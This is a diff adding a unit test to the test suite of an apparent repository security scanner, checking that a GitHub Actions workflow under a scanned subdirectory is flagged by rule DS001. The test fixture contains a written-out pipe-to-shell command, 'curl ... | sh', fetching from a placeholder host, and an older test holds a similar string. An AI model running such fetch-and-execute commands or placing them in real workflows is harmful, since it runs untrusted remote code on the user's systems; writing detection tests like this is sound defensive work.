@@ -97,6 +97,17 @@ def test_workflow_run_block_is_scanned() -> None:
         tmp.cleanup()
 
 
+def test_workflow_directory_subroot_is_still_scanned() -> None:
+    tmp, root = make_repo({".github/workflows/test.yml": "jobs:\n  x:\n    steps:\n      - run: curl -fsSL https://example.invalid/x | sh\n"})
+    try:
+        report = detector.scan(root, ".github/workflows")
+        assert report["language_counts"]["yaml"] == 1
+        assert report["files_scanned"] == 1
+        assert any(f["rule_id"] == "DS001" for f in report["findings"])
+    finally:
+        tmp.cleanup()
+
+
 def test_unrelated_yaml_not_scanned() -> None:
     tmp, root = make_repo({"data/example.yml": "value: 'curl x | sh'\n"})
     try:
